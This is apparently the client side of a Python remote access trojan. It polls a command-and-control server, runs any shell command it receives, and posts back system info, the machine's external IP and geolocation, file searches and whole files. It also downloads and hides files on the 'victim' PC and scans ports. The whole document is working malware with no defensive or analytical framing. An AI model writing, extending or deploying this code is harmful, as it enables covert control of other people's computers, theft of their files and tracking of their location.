
import os
import re
import time
import uuid
import json
import socket
import random
import getpass
import requests
import platform
import subprocess


HOST = "XHOST"
PORT = int("XPORT")
ADDRESS = f"http://{HOST}:{PORT}"
EXTERNAL_IP_ADDRESS = requests.get('https://api.ipify.org').text
TIME_TO_RECONNECT = random.randint(0, 5)
USER_NAME = getpass.getuser()
DOWNLOAD_PATH = "C:\\Users\\{}\\Desktop\\".format(USER_NAME)
STARTUP_PATH = r"C:\Users\{0}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup".format(USER_NAME)
currant_wd = os.path.dirname(__file__)
print (currant_wd)





def cmd(command):
    command_result = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE,
                                      stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    command_stdout = command_result.stdout.read()
    command_stderr = command_result.stderr.read()
    return (command_stdout, command_stderr)


# [-] System-Management
def system_info():
    full_info = cmd("systeminfo")[0].decode()
    sys_info = f"""
    System Info Summary
    +++++++++++++++++++
    System Type         : {platform.uname().system}
    Currant login User  : {platform.uname().node}
    System Release      : {platform.uname().release}
    System Version      : {platform.uname().version}
    Machine Architectur : {platform.uname().machine}
    External IP Address : {EXTERNAL_IP_ADDRESS}
    MAC Address         : {':'.join(re.findall('..', '%012x' % uuid.getnode()))}
    Shell Path          : {__file__}
    ========================================\n
    All About Summary (systeminfo command)
    +++++++++++++++++
        {full_info}
    ========================================\n"""
    requests.post(url = ADDRESS, data = sys_info)


def port_scanner(ip, ports):
    scan_result = f"[+] Scan Result of ({ports}) ports"
    for port in ports.split(","):
        socket_obj = socket.socket()
        try:
            result = socket_obj.connect_ex((ip, int(port)))
            if result == 0:
                scan_result += f"\n[+] Port {port} is open"
            else:
                scan_result += f"\n[-] Port {port} is close"
        except Exception as e:
            requests.post(url = ADDRESS, data = "[-] Error msg:\n" + e)
        requests.post(url = ADDRESS, data = scan_result)


def run(name):
    cmd(name)


def ip_info():
    try:
        ip_api = f"https://ipapi.co/{EXTERNAL_IP_ADDRESS}/json/"
        api_response = requests.get(ip_api)
        ip_info = json.loads(api_response.content)
        ip_result = f"""
        =====================================
        IP : {ip_info['ip']}
        City : {ip_info['city']}
        Region : {ip_info['region']}
        Region Code : {ip_info['region_code']}
        Country : {ip_info['country']}
        Country Code : {ip_info['country_code']}
        Country Capital : {ip_info['country_capital']}
        Country Name : {ip_info['country_name']}
        Latitude : {ip_info['latitude']}
        Longitude : {ip_info['longitude']}
        Timezone : {ip_info['timezone']}
        Country Calling Code : {ip_info['country_calling_code']}
        Currency : {ip_info['currency']}
        Currency Name : {ip_info['currency_name']}
        Country Language : {ip_info['languages']}
        Country Area : {ip_info['country_area']} KM
        Country Population : {int(ip_info['country_population'])} Person
        Asn : {ip_info['asn']}
        ISP-ORG : {ip_info['org']}
        =====================================\n"""
        print(ip_result)
        requests.post(url = ADDRESS, data = ip_result)
    except Exception as e:
        requests.post(url = ADDRESS, data = "[-] Error msg:\n" + e)


def find_with(path, extension):
    results = ""
    requests.post(url = ADDRESS, data = f"[+] Searching about [.{extension}] @ {path}. . .\n")
    for directory, _, files in os.walk(path):
        for file in files:
            if file.endswith(f".{extension}"):
                results = results + "\n" + os.path.join(directory, file)
    if results == "":
        requests.post(url = ADDRESS, data = "[-] No {0}@{1} Directory!".format(extension, path))
    else:
        requests.post(url = ADDRESS, data = "[+] Final Results:\n" + results + "\n[+] I hope it was helpful to you :)\n")


def download(file_name, url):
    path = DOWNLOAD_PATH
    try:
        if os.path.isdir(path):
            os.chdir(path)
            # the command to download file from the server
            command = f"curl.exe --output {file_name} --url {url}"
            # cmd returns pair (out, err)
            result = cmd(command)
            check_file = f"{path}\\{file_name}"
            while True:
                if os.path.isfile(check_file):
                    # check if the file downloaded
                    requests.post(url = ADDRESS, data = result[0])
                    requests.post(url = ADDRESS, data = result[1])
                    requests.post(url = ADDRESS, data = f"[+] File was uploaded successfully! @{path}")
                    # hide the file
                    cmd(f"attrib +h {file_name}")
                    break # exit the loop
                else:
                    # wait a second
                    time.sleep(1)
                    requests.post(url = ADDRESS, data = "[-] Wait Seccond plz!")
            
    except Exception as error:
        requests.post(url = ADDRESS, data = str(error).encode())


def whoami():
    pass



# script starts here:
def main():

    while True:
        try:
            # reading commands from the server
            command = requests.get(ADDRESS)

            if 'get' in command:
                # get files from the clint
                _, path = command.split(" ")
                if os.path.exists(path):
                    # redirect to the store file @ serevr side
                    url = ADDRESS + "/store"
                    files = {'file': open(path, 'rb')}
                    requests.post(url, files = files)
                else:
                    requests.post(url = ADDRESS, data = '[-] Unable to find the file!'.encode())

            # file navigation
            elif "cd" in command:
                _, directory = command.split(" ")
                try:
                    os.chdir(directory)
                    cwd = f"[+] CWD : {os.getcwd()}"
                    requests.post(url = ADDRESS, data = cwd)
                except Exception as error:
                    requests.post(url = ADDRESS, data = str(error))

            # port scanner
            elif "scan" in command:
                _, com = command.split(" ")
                com = com.split(":")
                # calling scanner function
                port_scanner(com[0], com[1])


            elif "system-info" in command:
                # calling system_information function
                system_info()


            elif "find" in command:
                # delete find keyword
                command = command[5:]
                # split the command for extension and path
                extension, path = command.split("@")
                # calling find function
                find_with(path, extension)


            elif "geo_ip" in command:
                # calling ip geolocation function
                ip_info()

            elif "upload" in command:
                file_name, url = command[7:].split("@")
                # download files to this "victim" PC 
                download(file_name, url)

            elif "kill" in command:
                pass

            else:
                # pass command to cmd/terminal to be executed
                result_out, result_error = cmd(command)
                # POST the command result to the server
                requests.post(url = ADDRESS, data = result_out)
                requests.post(url = ADDRESS, data = result_error)
        except:
            # try to reconnect
            time.sleep(TIME_TO_RECONNECT)


if __name__ == "__main__":
    # calling main function
    while True:
        main()
